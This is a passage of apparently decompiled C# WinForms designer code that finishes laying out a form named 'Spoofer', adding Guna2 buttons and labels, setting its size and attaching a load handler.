      this.Controls.Add((Control) this.guna2Button4);
      this.Controls.Add((Control) this.guna2Button3);
      this.Controls.Add((Control) this.guna2Button2);
      this.Controls.Add((Control) this.guna2Button1);
      this.Controls.Add((Control) this.label6);
      this.Controls.Add((Control) this.label1);
      this.Name = nameof (Spoofer);
      this.Size = new Size(521, 345);
      this.Load += new EventHandler(this.Spoofer_Load);
      ((ISupportInitialize) this.guna2PictureBox1).EndInit();
      this.ResumeLayout(false);
      this.PerformLayout();
    }
  }
}
